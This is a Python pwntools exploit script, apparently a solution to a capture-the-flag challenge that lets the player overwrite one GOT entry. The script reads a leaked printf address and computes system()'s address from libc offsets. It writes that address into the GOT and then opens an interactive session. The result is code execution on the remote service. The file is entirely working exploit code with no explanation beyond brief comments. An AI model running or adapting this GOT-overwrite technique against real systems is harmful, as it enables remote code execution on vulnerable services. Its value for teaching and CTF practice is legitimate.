from pwn import *

#conn = remote('127.0.0.1',1337)
conn = remote('vuln.redrocket.club',4546)
# Welcome to the overwrite-one-GOT-entry service!
output = conn.recvline()
# printf at: 0x7f6c12b34e80 GOT at: 0x563b48f45000
output = conn.recvline()
# decode from bytes to string
output = output.decode("utf-8")
# print output
print(output)

# find printf address in output
word = "f at: "
index = output.find(word)
current_printf_address = output[11:25]
# print current printf address
print(current_printf_address)

# calculate difference between printf and system from used libc version
# define used libc
libc = ELF('./ubuntu_libc6_2.27-3ubuntu1_amd64.deb.so')
#get offset of the systemcalls
printf_offset = libc.symbols['printf']
print("printf_offset: " + str(printf_offset))
system_offset = libc.symbols['system']
print("system_offset: " + str(system_offset))
# calculate difference
difference = printf_offset - system_offset
print("diff: " + str(difference))

# calculate system() offset from remote
remote_system_offset = int(str(current_printf_address), 16) - difference
print("remote system offset: " + str(remote_system_offset))
remote_system_offset = remote_system_offset
print("hex remote system offset: " + str(hex(remote_system_offset)))

conn.recvuntil(b'y!')

# pack
payload = p64(remote_system_offset)
print(payload)

# send a 3 for third entry in GOT
conn.sendline(str(3))
# send remote_system()call_address
conn.sendline(payload)

conn.interactive()

